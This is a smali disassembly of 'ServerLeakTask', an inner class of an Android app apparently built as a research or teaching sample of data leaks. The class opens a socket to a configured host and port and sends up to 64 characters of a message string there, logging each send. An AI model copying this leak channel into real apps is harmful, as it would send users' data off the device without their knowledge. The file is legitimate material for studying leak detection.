.class Ledu/fandm/enovak/leaks/Main$ServerLeakTask;
.super Landroid/os/AsyncTask;
.source "Main.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Ledu/fandm/enovak/leaks/Main;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = "ServerLeakTask"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$0:Ledu/fandm/enovak/leaks/Main;


# direct methods
.method constructor <init>(Ledu/fandm/enovak/leaks/Main;)V
    .locals 0
    .param p1, "this$0"    # Ledu/fandm/enovak/leaks/Main;

    .line 453
    iput-object p1, p0, Ledu/fandm/enovak/leaks/Main$ServerLeakTask;->this$0:Ledu/fandm/enovak/leaks/Main;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 453
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Ledu/fandm/enovak/leaks/Main$ServerLeakTask;->doInBackground([Ljava/lang/String;)Ljava/lang/Void;

    move-result-object p1

    return-object p1
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/Void;
    .locals 6
    .param p1, "msgs"    # [Ljava/lang/String;

    .line 459
    const/4 v0, 0x0

    aget-object v1, p1, v0

    .line 460
    .local v1, "msg":Ljava/lang/String;
    invoke-static {}, Ledu/fandm/enovak/leaks/Main;->access$000()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Sending: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "  to "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Ledu/fandm/enovak/leaks/Main$ServerLeakTask;->this$0:Ledu/fandm/enovak/leaks/Main;

    invoke-static {v4}, Ledu/fandm/enovak/leaks/Main;->access$200(Ledu/fandm/enovak/leaks/Main;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ":"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Ledu/fandm/enovak/leaks/Main$ServerLeakTask;->this$0:Ledu/fandm/enovak/leaks/Main;

    invoke-static {v4}, Ledu/fandm/enovak/leaks/Main;->access$300(Ledu/fandm/enovak/leaks/Main;)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 463
    :try_start_0
    new-instance v2, Ljava/net/Socket;

    iget-object v3, p0, Ledu/fandm/enovak/leaks/Main$ServerLeakTask;->this$0:Ledu/fandm/enovak/leaks/Main;

    invoke-static {v3}, Ledu/fandm/enovak/leaks/Main;->access$200(Ledu/fandm/enovak/leaks/Main;)Ljava/lang/String;

    move-result-object v3

    iget-object v4, p0, Ledu/fandm/enovak/leaks/Main$ServerLeakTask;->this$0:Ledu/fandm/enovak/leaks/Main;

    invoke-static {v4}, Ledu/fandm/enovak/leaks/Main;->access$300(Ledu/fandm/enovak/leaks/Main;)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    invoke-direct {v2, v3, v4}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    .line 464
    .local v2, "s":Ljava/net/Socket;
    new-instance v3, Ljava/io/OutputStreamWriter;

    invoke-virtual {v2}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 467
    .local v3, "out":Ljava/io/OutputStreamWriter;
    const/16 v4, 0x40

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v5

    invoke-static {v4, v5}, Ljava/lang/Math;->min(II)I

    move-result v4

    .line 468
    .local v4, "min":I
    invoke-virtual {v3, v1, v0, v4}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;II)V

    .line 469
    invoke-virtual {v3}, Ljava/io/OutputStreamWriter;->flush()V

    .line 472
    invoke-virtual {v3}, Ljava/io/OutputStreamWriter;->close()V

    .line 473
    invoke-virtual {v2}, Ljava/net/Socket;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 478
    .end local v2    # "s":Ljava/net/Socket;
    .end local v3    # "out":Ljava/io/OutputStreamWriter;
    .end local v4    # "min":I
    goto :goto_0

    .line 475
    :catch_0
    move-exception v0

    .line 476
    .local v0, "ioe":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 479
    .end local v0    # "ioe":Ljava/io/IOException;
    :goto_0
    const/4 v0, 0x0

    return-object v0
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .line 453
    check-cast p1, Ljava/lang/Void;

    invoke-virtual {p0, p1}, Ledu/fandm/enovak/leaks/Main$ServerLeakTask;->onPostExecute(Ljava/lang/Void;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/Void;)V
    .locals 2
    .param p1, "v"    # Ljava/lang/Void;

    .line 484
    invoke-static {}, Ledu/fandm/enovak/leaks/Main;->access$000()Ljava/lang/String;

    move-result-object v0

    const-string v1, "Message sent to server!"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 485
    return-void
.end method

.method protected onPreExecute()V
    .locals 0

    .line 456
    return-void
.end method
